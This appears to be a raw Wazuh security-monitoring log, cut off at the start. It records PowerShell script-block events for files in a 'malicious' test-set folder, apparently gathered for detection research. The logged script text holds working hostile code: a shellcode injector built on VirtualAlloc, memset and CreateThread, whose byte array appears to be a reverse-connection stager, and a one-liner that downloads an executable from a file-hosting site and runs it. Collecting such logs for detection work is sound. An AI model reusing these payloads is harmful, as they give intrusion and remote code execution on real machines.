$z.Length};$uIDY=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($uIDY.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$uIDY,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: d58c53b7-e257-47b4-85ab-de0d5e7a39a1\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2873.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$949 = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $949 -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb3,0xec,0xe0,0x68,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$uIDY=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($uIDY.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$uIDY,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"d58c53b7-e257-47b4-85ab-de0d5e7a39a1","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2873.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:35.844+0000","rule":{"level":4,"description":"Powershell script querying system environment variables","id":"91816","mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]},"firedtimes":12,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304435.3423654","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:55.6981034Z","eventRecordID":"145463","processID":"8668","threadID":"7452","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/ultxkr.exe',\"$env:TEMP\\uuuu.exe\");Start-Process (\"$env:TEMP\\uuuu.exe\")\r\n\r\nScriptBlock ID: 996a1ff7-566d-428a-91cf-cff8010469c0\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2876.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/ultxkr.exe',\\\"$env:TEMP\\\\uuuu.exe\\\");Start-Process (\\\"$env:TEMP\\\\uuuu.exe\\\")","scriptBlockId":"996a1ff7-566d-428a-91cf-cff8010469c0","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2876.ps1"}}},"location":"EventChannel"}
